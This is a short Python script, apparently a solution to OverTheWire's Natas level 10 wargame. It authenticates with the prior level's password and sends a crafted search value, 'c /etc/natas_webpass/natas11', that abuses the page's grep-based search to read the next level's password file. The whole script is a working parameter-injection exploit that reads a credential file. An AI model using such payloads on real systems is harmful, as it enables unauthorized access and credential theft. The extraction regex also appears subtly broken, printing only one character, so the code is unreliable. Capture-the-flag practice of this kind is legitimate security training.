import re
import requests
from requests.auth import HTTPBasicAuth
import natas9solution

auth = HTTPBasicAuth('natas10', natas9solution.get_pass())
def get_pass():
    param = {'needle':'c /etc/natas_webpass/natas11','submit':'Search'}
    r = requests.get('http://natas10.natas.labs.overthewire.org/', auth=auth, params=param)
    pass_regex = '[a-zA-Z0-9]'
    print(re.findall(pass_regex,r.text)[1])
if __name__ == "__main__":
    get_pass()
